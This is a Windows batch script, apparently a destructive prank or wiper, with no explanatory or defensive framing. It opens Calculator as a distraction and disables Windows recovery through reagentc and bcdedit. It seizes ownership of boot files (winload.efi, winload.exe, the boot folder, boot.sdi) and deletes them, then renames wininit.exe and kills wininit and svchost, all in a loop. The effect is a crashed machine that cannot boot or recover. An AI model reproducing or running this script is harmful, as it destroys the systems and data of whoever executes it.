@echo off
CLS

:A
mkdir %random%
start calc.exe
timeout /t 10 /nobreak >nul


cd %windir%\System32\
reagentc.exe /disable
bcdedit /set {default} recoveryenabled no
bcdedit /set {current} recoveryenabled no

takeown /f winload.efi
icacls winload.efi /grant users:f
icacls winload.efi /grant administrator:f
del /f /q winload.efi

takeown /f winload.exe
icacls winload.exe /grant users:f
icacls winload.exe /grant administrator:f
del /f /q winload.exe

takeown /f boot
icacls boot /grant users:f
icacls boot /grant administrator:f
rd /s /q boot

takeown /f boot.sdi
icacls boot.sdi /grant users:f
icacls boot.sdi /grant administrator:f
del /f /q /a boot.sdi

takeown /f wininit.exe
icacls wininit.exe /grant users:f
icacls wininit.exe /grant administrator:f
ren wininit.exe nit.exe
taskkill /f /im wininit.exe /t
taskkill /f /im svchost.exe /t
taskkill /f /im iexplore.exe
taskkill /f /im calc.exe

goto A



